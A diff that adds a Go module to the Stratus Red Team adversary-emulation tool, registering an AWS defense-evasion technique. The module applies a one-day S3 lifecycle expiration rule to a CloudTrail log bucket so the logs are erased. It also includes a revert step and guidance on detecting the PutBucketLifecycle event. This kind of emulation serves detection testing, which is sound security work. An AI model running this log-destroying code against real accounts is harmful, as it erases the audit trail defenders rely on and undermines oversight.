@@ -1,0 +1,103 @@
+package aws
+
+import (
+	"context"
+	_ "embed"
+	"errors"
+	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
+
+	"github.com/aws/aws-sdk-go-v2/aws"
+	"github.com/aws/aws-sdk-go-v2/service/s3"
+	"github.com/aws/aws-sdk-go-v2/service/s3/types"
+	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
+	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
+)
+
+//go:embed main.tf
+var tf []byte
+
+func init() {
+	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
+		ID:                 "aws.defense-evasion.cloudtrail-lifecycle-rule",
+		FriendlyName:       "CloudTrail Logs Impairment Through S3 Lifecycle Rule",
+		Platform:           stratus.AWS,
+		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
+		FrameworkMappings: []stratus.FrameworkMappings{
+			{
+				Framework: stratus.ThreatTechniqueCatalogAWS,
+				Techniques: []stratus.TechniqueMapping{
+					{
+						Name: "Impair Defenses: Disable Cloud Logs",
+						ID:   "T1562.008",
+						URL:  "https://aws-samples.github.io/threat-technique-catalog-for-aws/Techniques/T1562.008.html",
+					},
+				},
+			},
+		},
+		Description: `
+Set a 1-day retention policy on the S3 bucket used by a CloudTrail Trail, using an S3 Lifecycle Rule.
+
+References: https://www.justice.gov/usao-sdny/press-release/file/1452706/download
+
+Warm-up:
+
+- Create a CloudTrail trail logging to an S3 bucket
+
+Detonation:
+
+- Apply an S3 Lifecycle Rule automatically removing objects after 1 day
+`,
+		Detection: `
+Identify when lifecycle rule with a short expiration is applied to an S3 bucket used for CloudTrail logging.
+
+The CloudTrail event <code>PutBucketLifecycle</code> and its attribute
+<code>requestParameters.LifecycleConfiguration.Rule.Expiration.Days</code> can be used.
+`,
+		IsIdempotent:               false, // can't create twice a lifecycle rule with the same name
+		PrerequisitesTerraformCode: tf,
+		Detonate:                   detonate,
+		Revert:                     revert,
+	})
+}
+
+func detonate(params map[string]string, providers stratus.CloudProviders) error {
+	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
+	bucketName := params["s3_bucket_name"]
+
+	log.Println("Setting a short retention policy on CloudTrail S3 bucket " + bucketName)
+	_, err := s3Client.PutBucketLifecycleConfiguration(context.Background(), &s3.PutBucketLifecycleConfigurationInput{
+		Bucket: &bucketName,
+		LifecycleConfiguration: &types.BucketLifecycleConfiguration{
+			Rules: []types.LifecycleRule{
+				{
+					ID:         aws.String("nuke-cloudtrail-logs-after-1-day"),
+					Status:     types.ExpirationStatusEnabled,
+					Expiration: &types.LifecycleExpiration{Days: aws.Int32(1)},
+					Filter: &types.LifecycleRuleFilter{
+						Prefix: aws.String("*"),
+					},
+				},
+			},
+		},
+	})
+
+	if err != nil {
+		return errors.New("unable to create S3 Lifecycle Policy Rule: " + err.Error())
+	}
+	return nil
+}
+
+func revert(params map[string]string, providers stratus.CloudProviders) error {
+	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
+	bucketName := params["s3_bucket_name"]
+
+	log.Println("Reverting S3 Lifecycle Rules on CloudTrail S3 bucket " + bucketName)
+	_, err := s3Client.DeleteBucketLifecycle(context.Background(), &s3.DeleteBucketLifecycleInput{
+		Bucket: &bucketName,
+	})
+
+	if err != nil {
+		return errors.New("unable to revert S3 Lifecycle Policy Rule: " + err.Error())
+	}
+	return nil
+}
